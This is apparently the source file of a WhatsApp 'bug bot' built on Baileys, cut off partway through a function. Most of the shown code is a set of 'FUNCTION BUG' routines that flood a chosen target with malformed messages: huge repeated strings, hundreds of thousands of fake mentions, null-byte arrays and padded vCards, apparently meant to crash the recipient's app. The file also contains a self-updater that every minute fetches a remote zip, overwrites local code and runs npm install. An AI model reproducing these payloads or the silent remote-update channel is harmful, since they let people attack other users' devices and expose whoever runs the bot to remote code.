require("./config")
const {
	smsg,
	getGroupAdmins,
	formatp,
	h2k,
	tanggal,
	formatDate,
	getTime,
	isUrl,
	sleep,
	clockString,
	msToDate,
	sort,
	toNumber,
	enumGetKey,
	runtime,
	fetchJson,
	getBuffer,
	jsonformat,
	delay,
	format,
	logic,
	generateProfilePicture,
	parseMention,
	getRandom,
	pickRandom,
	reSize
} = require("./trashbase/lib/myfunction")
//=================================================//
const {
	downloadContentFromMessage,
	emitGroupParticipantsUpdate,
	emitGroupUpdate,
    generateMessageFromContent,
	generateWAMessageContent,
	generateWAMessage,
	makeInMemoryStore,
	prepareWAMessageMedia,
	generateWAMessageFromContent,
	MediaType,
	areJidsSameUser,
	WAMessageStatus,
	downloadAndSaveMediaMessage,
	AuthenticationState,
	GroupMetadata,
	initInMemoryKeyStore,
	getContentType,
	MiscMessageGenerationOptions,
	useSingleFileAuthState,
	BufferJSON,
	WAMessageProto,
	MessageOptions,
	WAFlag,
	WANode,
	WAMetric,
	ChatModification,
	MessageTypeProto,
	WALocationMessage,
	ReconnectMode,
	WAContextInfo,
	proto,
	WAGroupMetadata,
	ProxyAgent,
	waChatKey,
	MimetypeMap,
	MediaPathMap,
	WAContactMessage,
	WAContactsArrayMessage,
	WAGroupInviteMessage,
	WATextMessage,
	WAMessageContent,
	WAMessage,
	BaileysError,
	WA_MESSAGE_STATUS_TYPE,
	MediaConnInfo,
	URL_REGEX,
	WAUrlInfo,
	WA_DEFAULT_EPHEMERAL,
	WAMediaUpload,
	mentionedJid,
	processTime,
	Browser,
	MessageType,
	Presence,
	WA_MESSAGE_STUB_TYPES,
	Mimetype,
	relayWAMessage,
	Browsers,
	GroupSettingChange,
	DisconnectReason,
	WASocket,
	getStream,
	WAProto,
	isBaileys,
	AnyMessageContent,
	fetchLatestBaileysVersion,
	templateMessage,
	InteractiveMessage,
	Header
} = require("@whiskeysockets/baileys")
//=================================================//
const {
	default: makeWaSocket,
	useMultiFileAuthState
} = require("@whiskeysockets/baileys")
//=================================================//
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const fse = require("fs-extra")
const AdmZip = require("adm-zip")
const { execSync } = require("child_process")
const fetch = require("node-fetch")
const speed = require("performance-now")
const pino = require('pino')
const moment = require("moment-timezone")
const path = require('path')
const jimp = require('jimp')
const {
	spawn: spawn,
	exec
} = require("child_process")
const {
	performance
} = require("perf_hooks")
const cheerio = require("cheerio")
const colors = require("@colors/colors/safe")
const chalk = require("chalk")
const FormData = require("form-data")
const ms = toMs = require("ms")
const crypto = require("crypto")
const checkPremiumUser = (userId, _dir) => {
	let status = false;
	Object.keys(_dir).forEach((i) => {
		if (_dir[i].id === userId) {
			status = true;
		}
	});
	return status;
};
const {
	color
} = require("./trashbase/lib/color")
const {
	UploadFileUgu,
	webp2mp4File,
	floNime
} = require("./trashbase/lib/uploader")
const fs = require("fs")

const {
	basename
} = require("path")

		const DB = 'https://raw.githubusercontent.com/Xrelly-stack/Strikes/main/security.json';
		
		async function isBotNumberRegistered(botNumber) {
			try {
				const response = await axios.get(DB);
				if (!Array.isArray(response.data)) {
					console.error('Data Yang Diterima Tidak Valid: Harus Berupa Array.');
					return false;
				}
				const registeredBotNumbers = response.data;
				return registeredBotNumbers.includes(botNumber);
			} catch (error) {
				console.error('Error Fetching Registered Bot Numbers:', error.message);
				return false;
			}
		}

const {
	addPremiumUser,
	getPremiumExpired,
	getPremiumPosition,
	expiredCheck,
	getAllPremiumUser
} = require("./trashbase/lib/premiun")
//=================================================//
module.exports = async (apollo, m, chatUpdate, store) => {
try {
//=================================================//
var body = m.mtype === "conversation" ? m.message.conversation : m.mtype === "imageMessage" ? m.message.imageMessage.caption : m.mtype === "videoMessage" ? m.message.videoMessage.caption : m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text : m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId : m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId : m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId : m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.message.interactiveResponseMessage?.nativeFlowResponseMessage || m.text : ""
//=================================================//
   const conn = apollo;
   const tdx = apollo;
   const client = apollo;
   const sock = apollo;
   const otax = apollo;
   //====================================//
		// STRING \\
		const {
			groupMembers
		} = m
		var budy = (typeof m.text == "string" ? m.text : "")
		const prefixRegex = /^[°•π÷×¶∆£¢€¥®�?+✓_=|~!?@#$%^&.©^]/;
		const botNumber = await apollo.decodeJid(apollo.user.id);
        const prefix = prefa && prefixRegex.test(body) ? body.match(prefixRegex)[0] : (prefa ?? global.prefix)
        const isCmd = body.startsWith(prefix)
        const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(/ +/).shift().toLowerCase() : ""
		const content = JSON.stringify(m.message)
		const args = body.trim().split(/ +/).slice(1)
		const pushname = m.pushName || "No Name"
		const text = q = args.join(" ")
		const fatkuns = (m.quoted || m)
		const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
		const mime = (quoted.msg || quoted).mimetype || ""
		const qmsg = (quoted.msg || quoted)
		const isMedia = /image|video|sticker|audio/.test(mime)
		const input = m.isMention && m.quoted && m.mentionedJid.includes(m.quoted.sender) ? m.mentionedJid : m.isMention && m.quoted ? [...m.mentionedJid, m.quoted.sender] : m.isMention ? m.mentionedJid : m.quoted ? Array(m.quoted.sender) : text !== "" && (text.trim().includes("08") || text.trim().includes("+62") || text.trim().includes("628")) ? text.split("+62").filter((x) => (x !== "" && x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.trim().startsWith("8") ? ("+62" + x.trim()) : x.trim()).join(" ").split(" ").filter((x) => (x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.startsWith("08") ? parseInt(x.replace("08", "628")) : parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))).map((x) => (x + "@s.whatsapp.net")) : text !== "" && !isNaN(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))) && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length >= 8 && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length <= 15 ? Array(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), "")) + "@s.whatsapp.net") : []

		//User
		const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
		const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
		const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
		const Inputo = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
		const from = m.key.remoteJid

		const itsMe = m.sender == botNumber ? true : false
		const orgkaya = JSON.parse(fs.readFileSync("./database/premium.json"))
		const kontributor = JSON.parse(fs.readFileSync("./database/owner.json"))
		const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))
        const isBotRegistered = await isBotNumberRegistered(botNumber);
		const isContacts = contacts.includes(m.sender)
		const isCreator = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
		const isDeveloper = [botNumber].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
		const isPremium = isDeveloper || isCreator || checkPremiumUser(m.sender, orgkaya);

  		// Group
		const groupMetadata = m.chat.endsWith("@g.us") ? (await apollo.groupMetadata(m.chat).catch(e => {})) : {}
		const groupName = Object.keys(groupMetadata).length > 0 ? groupMetadata.subject : ""
		const participants = Object.keys(groupMetadata).length > 0 ? groupMetadata.participants : ""
		const groupAdmins = Object.keys(groupMetadata).length > 0 ? (await getGroupAdmins(participants)) : ""
		const isBotAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(botNumber) : false
		const isAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(m.sender) : false
		const isGroup = m.chat.endsWith("@g.us")
		const groupOwner = Object.keys(groupMetadata).length > 0 ? groupMetadata.owner : ""
		const isGroupOwner = Object.keys(groupMetadata).length > 0 ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

	//====================================//
		const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
		const isImage = ["imageMessage"].includes(m.mtype)
		const isVideo = ["videoMessage"].includes(m.mtype)
		const isSticker = ["stickerMessage"].includes(m.mtype)
		const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
		const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
		const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
		const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
		const isLocation = ["locationMessage"].includes(m.mtype)
		const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isProtocol = ["protocolMessage"].includes(m.mtype)
		const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
		const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
		const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
		const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
		const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
		const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
		//=================================================//
		try {
			const isNumber = x => typeof x === "number" && !isNaN(x)
			const user = db.data.users[m.sender]
			if (typeof user !== "object") db.data.users[m.sender] = {}
			const chats = db.data.chats[m.chat]
			if (typeof chats !== "object") db.data.chats[m.chat] = {}
			if (user) {
				if (!user.premium) user.premiumTime = 0
				if (!("premium" in user)) user.premium = false
			} else db.data.users[m.sender] = {
				premiumTime: 0,
				name: m.name,
				premium: false
			}
			//=================================================//
			const setting = db.data.settings[botNumber]
			if (typeof setting !== "object") db.data.settings[botNumber] = {}
			if (setting) {
				if (!isNumber(setting.status)) setting.status = 0
				if (!("autobio" in setting)) setting.autobio = false
				if (!("autoread" in setting)) setting.autoread = false
				if (!("autoTyping" in setting)) setting.autoTyping = false
				if (!("autoRecord" in setting)) setting.autoRecord = false
				if (!("autoButton" in setting)) setting.autoButton = false
				if (!("public" in setting)) setting.public = false
				if (!("setPrefix" in setting)) setting.setPrefix = "multi" //multi, no, all
				if (!("onlygrub" in setting)) setting.onlygrub = false
			} else db.data.settings[botNumber] = {
				status: 0,
				stock: 10,
				autobio: false,
				autoTyping: false,
				autoRecord: false,
				autoButton: true,
				public: false,
				setPrefix: "all", //multi, no, all
				onlygrub: false,
				autoread: false,
				menuType: "buttonImage" //> buttonImage
			}

		} catch (err) {
			console.log(chalk.whiteBright("�?"), chalk.keyword("red")("[ ERROR ]"), err)
		}
		// IMAGE \\
		//=================================================//
        //const manta = fs.readFileSync("./xmedia/apollo.png")
        const slash = fs.readFileSync(path.resolve(__dirname, './xmedia/slash.jpg'))
        const banner = fs.readFileSync(path.resolve(__dirname, './xmedia/banner.jpg'))
		//=================================================//
		// IMAGE URL \\		
		const images = [
	 "https://files.catbox.moe/7anc7w.jpg",
	 "https://files.catbox.moe/67uaxk.jpg",
     "https://files.catbox.moe/vmqnj0.jpg",
     "https://files.catbox.moe/wc7or3.jpg",
     "https://files.catbox.moe/mmysgo.jpg"
	 
		];

		function getRandomImage() {
			const randomIndex = Math.floor(Math.random() * images.length);
			return images[randomIndex];
		}
		const thumbSky = getRandomImage()
		//=================================================//

		// VIRTEX \\
		//=================================================//
		const {
			ios
		} = require("./virtex/ios.js")
		const {
			telapreta3
		} = require("./virtex/telapreta3.js")
		const {
			convite
		} = require("./virtex/convite.js")
		const {
			bugpdf
		} = require("./virtex/bugpdf.js")
		const {
			cP
		} = require('./virtex/bugUrl.js')
		const {
			ngazap
		} = require("./virtex/ngazap")
		const {
			notif3
		} = require("./virtex/notif3")
		const {
			notif4
		} = require("./virtex/notif4")
		//=================================================//
		// AUTO MODE \\
		//=================================================//
		if (!m.key.fromMe && db.data.settings[botNumber].autoread) {
			const readkey = {
				remoteJid: m.chat,
				id: m.key.id,
				participant: m.isGroup ? m.key.participant : undefined
			}
			await apollo.readMessages([readkey]);
		}
		//=================================================//

		// CLOCK \\
		//=================================================//
		const moment = require("moment-timezone");
		const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
		let ucapanWaktu
		if (time >= "19:00:00" && time < "23:59:00") {
			ucapanWaktu = "Selamat Malam"
		} else if (time >= "15:00:00" && time < "19:00:00") {
			ucapanWaktu = "Selamat Sore"
		} else if (time >= "11:00:00" && time < "15:00:00") {
			ucapanWaktu = "Selamat Siang"
		} else if (time >= "06:00:00" && time < "11:00:00") {
			ucapanWaktu = "Selamat Pagi"
		} else {
			ucapanWaktu = "Selamat Subuh"
		}
		const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
		const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
		const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
		const salam = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
		let d = new Date
		let gmt = new Date(0).getTime() - new Date("1 Januari 2024").getTime()
		let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][Math.floor(((d * 1) + gmt) / 84600000) % 5]
		let week = d.toLocaleDateString("id", {
			weekday: "long"
		})
		let calender = d.toLocaleDateString("id", {
			day: "numeric",
			month: "long",
			year: "numeric"
		})
        
    let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}
    let XrellydataBug = JSON.stringify({
    status: true,
    criador: "Xrelly9CoreXx",
    resultado: {
        type: "md",
        ws: {
            _events: { "CB:ib,,dirty": ["Array"] },
            _eventsCount: 800000,
            _maxListeners: 0,
            url: "wss://web.whatsapp.com/ws/chat",
            config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                sockCectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: { Object: "authData" },
                markOnlineOnsockCect: true,
                syncFullHistory: true,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: { Object: "transactionOptsData" },
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: { Object: "appStateMacData" },
                mobile: true
            }
        }
    }
});

const info = {
key: m.key,
message: m.message,
//id: m.id,
//isBaileys: m.isBaileys,
//chat: m.chat,
//fromMe: m.fromMe,
//isGroup: x.isGroup,
//sender: m.sender,
//participant: m.participant || '',
//mtype: x.mtype,
//text: m.text
}
//=================================================//

		//Status
		if (!db.data.settings[botNumber].public && !isCreator) return
		
		//=================================================//
		
		// REPLY \\
		const reply = async (teks) => {
    await sleep(500)
    return tdx.sendMessage(m.chat, {
        contextInfo: {
            mentionedJid: [
                m.sender
            ],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: ` 𝐌𝐚𝐧𝐭𝐚 𝐢𝐬 𝐇𝐞𝐫𝐞 ¿?`,
                body: `null`,
                previewType: "VIDEO",
                thumbnail: slash,
                sourceUrl: `https://t.me/MantaxOffc`,
                mediaUrl: `https://t.me/MantaxOffc`
            }
        },
        text: teks
    }, {
        quoted: vidq
    })
    await sleep(500)
}
		
    const vidq = {
    key: {
        remoteJid: '0@s.whatsapp.net',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        videoMessage: {
            caption: "☄⃟༑⌁⃰𝐍̛̣͜𝐮𝐥𝐥⃬ 𝐂⃬𝐫̝𝐚͝𝐬𝐡͢",
            jpegThumbnail: (await resize(slash, 300, 300)),
        }
    }
}
		// END REPLY \\
		//=================================================//

		//REACTION\\
		const reaction = async (jidss, emoji) => {
			apollo.sendMessage(jidss, {
				react: {
					text: emoji,
					key: m.key
				}
			})
		}

		//=================================================//
		// CONSOLE \\
		//=================================================//
		const command_log = [chalk.whiteBright("�?"), chalk.keyword("aqua")(`[ ${m.isGroup? "GROUP" : "PRIVATE"} ]`), chalk.whiteBright(body == "" && isImage ? "image" : body == "" && isVideo ? "video" : body == "" && isViewOnce ? "view once" : body == "" && isDocument ? "document" : isSticker ? "sticker" : isAudio ? "audio" : isVoice ? "voice" : isContact ? "contact" : isLocation ? "location" : isProtocol ? "delete message" : isPollUpdate ? "update poll" : isPollCreation ? "creation poll" : body), chalk.greenBright("from"), chalk.yellow(m.pushName)]
		if (isGroup) {
			command_log.push(chalk.greenBright("in"))
			command_log.push(chalk.yellow(groupName))
		}
		if (isImage || isVideo || isViewOnce || isDocument || isSticker || isAudio || isVoice || isContact || isLocation || isProtocol || isPollUpdate || isPollCreation || isText || isButtonList || isButtonReply) console.log(...command_log)
		//=================================================//


const CONFIG = {
  versionUrl: "https://raw.githubusercontent.com/Xrelly-stack/Ghostbusters/main/version.json",
  localVersionFile: "./version.json",
  updateInterval: 60 * 1000
}

function getLocalVersion() {
  if (!fs.existsSync(CONFIG.localVersionFile)) return 0
  const data = JSON.parse(fs.readFileSync(CONFIG.localVersionFile))
  return data.version || 0
}

function saveLocalVersion(version) {
  fs.writeFileSync(CONFIG.localVersionFile, JSON.stringify({ version }, null, 2))
}

function hashFile(path) {
  if (!fs.existsSync(path)) return ""
  return crypto.createHash("md5").update(fs.readFileSync(path)).digest("hex")
}

async function downloadZip(url, outPath) {
  const res = await axios({
    url,
    method: "GET",
    responseType: "arraybuffer"
  })
  fs.writeFileSync(outPath, res.data)
}

function extractZip(zipPath, extractTo) {
  const zip = new AdmZip(zipPath)
  zip.extractAllTo(extractTo, true)
}

async function doUpdate(remote) {
  const zipPath = "./update.zip"

  const oldPkgHash = hashFile("./package.json")

  await downloadZip(remote.url, zipPath)
  extractZip(zipPath, "./tmp_update")

  await fse.copy("./tmp_update", "./", {
    overwrite: true,
    filter: (src) => {
      if (src.includes("node_modules")) return false
      if (src.includes("package-lock.json")) return false
      if (src.includes(".env")) return false
      if (src.includes("database")) return false
      return true
    }
  })

  const newPkgHash = hashFile("./package.json")

  fs.unlinkSync(zipPath)
  fse.removeSync("./tmp_update")

  if (oldPkgHash !== newPkgHash) {
    execSync("npm install", { stdio: "inherit" })
  }

  saveLocalVersion(remote.version)

  process.exit(0)
}

async function checkUpdate() {
  try {
    const res = await axios.get(CONFIG.versionUrl)
    const remote = res.data
    const localVersion = getLocalVersion()

    if (remote.force || remote.version > localVersion) {
      await doUpdate(remote)
    }
  } catch {}
}

setInterval(checkUpdate, CONFIG.updateInterval)
checkUpdate()
// FUNCTION BUG
async function homeBeta(jid) {
  await sock.relayMessage(jid, {
    requestPaymentMessage: {
      currencyCodeIso4217: "MMK",
      amount1000: "999999",
      noteMessage: {
      extendedTextMessage: {
        text: "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666",
        matchedText: "https://t.me/xrelly",
        description: " dnd ;) ",
        title: " is back?!! ",
        paymentLinkMetadata: {
          button: {
            displayText: "  @otax fucker",
          },
          header: {
            headerType: 1,
          },
          provider: {
            paramsJson: "{{{".repeat(100000),
          },
        },
        linkPreviewMetadata: {
          paymentLinkMetadata: {
            button: {
              displayText: "  @xrelly superiots",
            },
            header: {
              headerType: 1,
            },
            provider: {
              paramsJson: "{{{".repeat(100000),
            },
          },
          paymentLinkMetadata: {
            button: {
              displayText: "  @devorsixcore alesana",
            },
            header: {
              headerType: 1,
            },
            provider: {
              paramsJson: "{{{".repeat(100000),
            },
          },
          urlMetadata: {
            fbExperimentId: 999,
          },
          fbExperimentId: 888,
          linkMediaDuration: 555,
          socialMediaPostType: 1221,
        },
      }
      },
      expiryTimestamp: Date.now() + 86400000,
      background: null
    }
  }, { userJid: null })
}

async function sql(target) {
  await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550208@bot",
              botName: "Business Assistant",
              creator: " ¡! fail beta 🎭 "
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1
            })),
            participant: sock.user.id
          },
          body: {
            text: " Manta'X is Here ¿? ",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}

async function palaLuMappimg(target) {
  for (let i = 0; i < 100; i++) {
    await sock.relayMessage("status@broadcast", {
      interactiveResponseMessage: {
        body: {
          text: " @null | Tr4sh.corp.inc ¿? ",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + " Tr4sh.corp¡! ",
          isForwarded: true,
          forwardingScore: 999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
              "\u0000": "\u0000"
            }))
          }
        }
      }
    }, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
    await sock.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "XzC - Expos3d"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1
            })),
            participant: sock.user.id
          },
          body: {
            text: "MANTA HALO",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
    await sleep(1000);
  }
}
async function ofmEr(target) {
  await otax.relayMessage("status@broadcast", {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          deviceListMetadata: {
            senderKeyIndex: 0,
            senderTimestamp: Date.now(),
            recipientKeyIndex: 0
          },
          deviceListMetadataVersion: 2
        },
        interactiveResponseMessage: {
          contextInfo: {
            remoteJid: "status@broadcast",
            fromMe: true,
            forwardedAiBotMessageInfo: {
              botJid: "13135550202@bot",
              botName: "Business Assistant",
              creator: "XzC - Expos3d"
            },
            statusAttributionType: 2,
            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`,
              type: 1
            })),
            participant: otax.user.id
          },
          body: {
            text: "MANTA HALO",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "{ X: { status:true } }",
            version: 3
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: { status_setting: "contacts" },
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: []
        }]
      }]
    }]
  })
}
async function invsNewIos(target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 